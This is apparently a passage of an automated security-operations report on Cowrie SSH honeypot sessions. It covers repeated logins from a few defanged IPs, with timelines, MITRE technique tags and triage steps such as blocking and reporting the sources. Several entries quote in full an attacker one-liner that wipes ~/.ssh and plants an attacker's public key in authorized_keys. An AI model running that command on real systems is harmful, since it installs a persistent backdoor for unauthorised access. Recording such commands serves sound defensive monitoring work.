| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:28:42` | `cowrie.session.connect` |
| `2026-04-25 12:28:42` | `cowrie.client.version` |
| `2026-04-25 12:28:42` | `cowrie.client.kex` |
| `2026-04-25 12:28:44` | `cowrie.login.success` |
| `2026-04-25 12:28:44` | `cowrie.session.params` |
| `2026-04-25 12:28:44` | `cowrie.command.input` |
| `2026-04-25 12:28:44` | `cowrie.command.failed` |
| `2026-04-25 12:28:45` | `cowrie.log.closed` |
| `2026-04-25 12:28:45` | `cowrie.session.params` |
| `2026-04-25 12:28:45` | `cowrie.command.input` |
| `2026-04-25 12:28:46` | `cowrie.session.file_download` |
| `2026-04-25 12:28:46` | `cowrie.log.closed` |
| `2026-04-25 12:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da6b1d83e378

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:28 |
| **Last Seen** | 2026-04-25 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:28:49` | `cowrie.session.connect` |
| `2026-04-25 12:28:49` | `cowrie.client.version` |
| `2026-04-25 12:28:50` | `cowrie.client.kex` |
| `2026-04-25 12:28:51` | `cowrie.login.success` |
| `2026-04-25 12:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12b6394fea65

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:29 |
| **Last Seen** | 2026-04-25 12:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:29:46` | `cowrie.session.connect` |
| `2026-04-25 12:29:46` | `cowrie.client.version` |
| `2026-04-25 12:29:47` | `cowrie.client.kex` |
| `2026-04-25 12:29:48` | `cowrie.login.success` |
| `2026-04-25 12:29:49` | `cowrie.session.params` |
| `2026-04-25 12:29:49` | `cowrie.command.input` |
| `2026-04-25 12:29:49` | `cowrie.command.failed` |
| `2026-04-25 12:29:49` | `cowrie.log.closed` |
| `2026-04-25 12:29:50` | `cowrie.session.params` |
| `2026-04-25 12:29:50` | `cowrie.command.input` |
| `2026-04-25 12:29:50` | `cowrie.session.file_download` |
| `2026-04-25 12:29:50` | `cowrie.log.closed` |
| `2026-04-25 12:29:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2323e27c3e64

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:29 |
| **Last Seen** | 2026-04-25 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:29:53` | `cowrie.session.connect` |
| `2026-04-25 12:29:53` | `cowrie.client.version` |
| `2026-04-25 12:29:54` | `cowrie.client.kex` |
| `2026-04-25 12:29:55` | `cowrie.login.success` |
| `2026-04-25 12:29:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063d3fa9200f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:30 |
| **Last Seen** | 2026-04-25 12:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:30:50` | `cowrie.session.connect` |
| `2026-04-25 12:30:50` | `cowrie.client.version` |
| `2026-04-25 12:30:51` | `cowrie.client.kex` |
| `2026-04-25 12:30:52` | `cowrie.login.success` |
| `2026-04-25 12:30:52` | `cowrie.session.params` |
| `2026-04-25 12:30:52` | `cowrie.command.input` |
| `2026-04-25 12:30:52` | `cowrie.command.failed` |
| `2026-04-25 12:30:53` | `cowrie.log.closed` |
| `2026-04-25 12:30:53` | `cowrie.session.params` |
| `2026-04-25 12:30:53` | `cowrie.command.input` |
| `2026-04-25 12:30:54` | `cowrie.session.file_download` |
| `2026-04-25 12:30:54` | `cowrie.log.closed` |
| `2026-04-25 12:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c4e94d075eb

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:30 |
| **Last Seen** | 2026-04-25 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:30:57` | `cowrie.session.connect` |
| `2026-04-25 12:30:57` | `cowrie.client.version` |
| `2026-04-25 12:30:57` | `cowrie.client.kex` |
| `2026-04-25 12:30:59` | `cowrie.login.success` |
| `2026-04-25 12:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6ce720a6de1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:31 |
| **Last Seen** | 2026-04-25 12:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:31:57` | `cowrie.session.connect` |
| `2026-04-25 12:31:57` | `cowrie.client.version` |
| `2026-04-25 12:31:57` | `cowrie.client.kex` |
| `2026-04-25 12:31:58` | `cowrie.login.success` |
| `2026-04-25 12:31:59` | `cowrie.session.params` |
| `2026-04-25 12:31:59` | `cowrie.command.input` |
| `2026-04-25 12:31:59` | `cowrie.command.failed` |
| `2026-04-25 12:31:59` | `cowrie.log.closed` |
| `2026-04-25 12:32:00` | `cowrie.session.params` |
| `2026-04-25 12:32:00` | `cowrie.command.input` |
| `2026-04-25 12:32:00` | `cowrie.session.file_download` |
| `2026-04-25 12:32:00` | `cowrie.log.closed` |
| `2026-04-25 12:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0763023115b8

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:32 |
| **Last Seen** | 2026-04-25 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:32:04` | `cowrie.session.connect` |
| `2026-04-25 12:32:04` | `cowrie.client.version` |
| `2026-04-25 12:32:04` | `cowrie.client.kex` |
| `2026-04-25 12:32:06` | `cowrie.login.success` |
| `2026-04-25 12:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97d978a5cf76

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:32 |
| **Last Seen** | 2026-04-25 12:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:32:44` | `cowrie.session.connect` |
| `2026-04-25 12:32:44` | `cowrie.client.version` |
| `2026-04-25 12:32:44` | `cowrie.client.kex` |
| `2026-04-25 12:32:45` | `cowrie.login.success` |
| `2026-04-25 12:32:45` | `cowrie.session.params` |
| `2026-04-25 12:32:45` | `cowrie.command.input` |
| `2026-04-25 12:32:45` | `cowrie.command.failed` |
| `2026-04-25 12:32:45` | `cowrie.log.closed` |
| `2026-04-25 12:32:46` | `cowrie.session.params` |
| `2026-04-25 12:32:46` | `cowrie.command.input` |
| `2026-04-25 12:32:46` | `cowrie.session.file_download` |
| `2026-04-25 12:32:46` | `cowrie.log.closed` |
| `2026-04-25 12:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33b4e1cd594c

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:32 |
| **Last Seen** | 2026-04-25 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:32:49` | `cowrie.session.connect` |
| `2026-04-25 12:32:49` | `cowrie.client.version` |
| `2026-04-25 12:32:49` | `cowrie.client.kex` |
| `2026-04-25 12:32:50` | `cowrie.login.success` |
| `2026-04-25 12:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73a6264ce877

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:33 |
| **Last Seen** | 2026-04-25 12:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:33:39` | `cowrie.session.connect` |
| `2026-04-25 12:33:39` | `cowrie.client.version` |
| `2026-04-25 12:33:39` | `cowrie.client.kex` |
| `2026-04-25 12:33:40` | `cowrie.login.success` |
| `2026-04-25 12:33:40` | `cowrie.session.params` |
| `2026-04-25 12:33:40` | `cowrie.command.input` |
| `2026-04-25 12:33:40` | `cowrie.command.failed` |
| `2026-04-25 12:33:40` | `cowrie.log.closed` |
| `2026-04-25 12:33:41` | `cowrie.session.params` |
| `2026-04-25 12:33:41` | `cowrie.command.input` |
| `2026-04-25 12:33:41` | `cowrie.session.file_download` |
| `2026-04-25 12:33:41` | `cowrie.log.closed` |
| `2026-04-25 12:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c99b4e9c40

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:33 |
| **Last Seen** | 2026-04-25 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:33:44` | `cowrie.session.connect` |
| `2026-04-25 12:33:44` | `cowrie.client.version` |
| `2026-04-25 12:33:45` | `cowrie.client.kex` |
| `2026-04-25 12:33:46` | `cowrie.login.success` |
| `2026-04-25 12:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-904bdc5d8d41

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:33 |
| **Last Seen** | 2026-04-25 12:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:33:48` | `cowrie.session.connect` |
| `2026-04-25 12:33:48` | `cowrie.client.version` |
| `2026-04-25 12:33:49` | `cowrie.client.kex` |
| `2026-04-25 12:33:50` | `cowrie.login.success` |
| `2026-04-25 12:33:51` | `cowrie.session.params` |
| `2026-04-25 12:33:51` | `cowrie.command.input` |
| `2026-04-25 12:33:51` | `cowrie.command.failed` |
| `2026-04-25 12:33:51` | `cowrie.log.closed` |
| `2026-04-25 12:33:52` | `cowrie.session.params` |
| `2026-04-25 12:33:52` | `cowrie.command.input` |
| `2026-04-25 12:33:52` | `cowrie.session.file_download` |
| `2026-04-25 12:33:52` | `cowrie.log.closed` |
| `2026-04-25 12:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a15028867df

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:33 |
| **Last Seen** | 2026-04-25 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:33:55` | `cowrie.session.connect` |
| `2026-04-25 12:33:55` | `cowrie.client.version` |
| `2026-04-25 12:33:56` | `cowrie.client.kex` |
| `2026-04-25 12:33:57` | `cowrie.login.success` |
| `2026-04-25 12:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-786a67ea6f0a

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:34 |
| **Last Seen** | 2026-04-25 12:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:34:30` | `cowrie.session.connect` |
| `2026-04-25 12:34:30` | `cowrie.client.version` |
| `2026-04-25 12:34:30` | `cowrie.client.kex` |
| `2026-04-25 12:34:31` | `cowrie.login.success` |
| `2026-04-25 12:34:32` | `cowrie.session.params` |
| `2026-04-25 12:34:32` | `cowrie.command.input` |
| `2026-04-25 12:34:32` | `cowrie.command.failed` |
| `2026-04-25 12:34:32` | `cowrie.log.closed` |
| `2026-04-25 12:34:33` | `cowrie.session.params` |
| `2026-04-25 12:34:33` | `cowrie.command.input` |
| `2026-04-25 12:34:33` | `cowrie.session.file_download` |
| `2026-04-25 12:34:33` | `cowrie.log.closed` |
| `2026-04-25 12:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5827c99bc71

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:34 |
| **Last Seen** | 2026-04-25 12:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:34:31` | `cowrie.session.connect` |
| `2026-04-25 12:34:31` | `cowrie.client.version` |
| `2026-04-25 12:34:31` | `cowrie.client.kex` |
| `2026-04-25 12:34:32` | `cowrie.login.success` |
| `2026-04-25 12:34:33` | `cowrie.session.params` |
| `2026-04-25 12:34:33` | `cowrie.command.input` |
| `2026-04-25 12:34:33` | `cowrie.command.failed` |
| `2026-04-25 12:34:33` | `cowrie.log.closed` |
| `2026-04-25 12:34:33` | `cowrie.session.params` |
| `2026-04-25 12:34:33` | `cowrie.command.input` |
| `2026-04-25 12:34:33` | `cowrie.session.file_download` |
| `2026-04-25 12:34:33` | `cowrie.log.closed` |
| `2026-04-25 12:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb317d7dc65

| Field | Detail |
|---|---|
| **Source IP** | `159.203.181[.]139` |
| **First Seen** | 2026-04-25 12:34 |
| **Last Seen** | 2026-04-25 12:34 |
| **Session Duration** | 1s |
